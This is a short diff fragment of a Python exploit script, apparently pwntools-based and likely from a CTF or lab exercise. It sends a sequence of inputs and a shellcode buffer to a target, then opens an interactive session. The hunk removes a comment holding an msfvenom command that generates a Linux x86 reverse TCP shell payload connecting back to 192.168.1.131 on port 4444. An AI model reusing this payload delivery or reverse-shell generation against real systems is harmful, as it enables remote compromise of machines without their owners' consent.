@@ -84,7 +84,6 @@ if __name__ == '__main__':
 	shell.sendline(b'48093572')
 	shell.sendline(b'3')
 
-	#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
 	shell.sendline(buf)
 
 	shell.interactive()
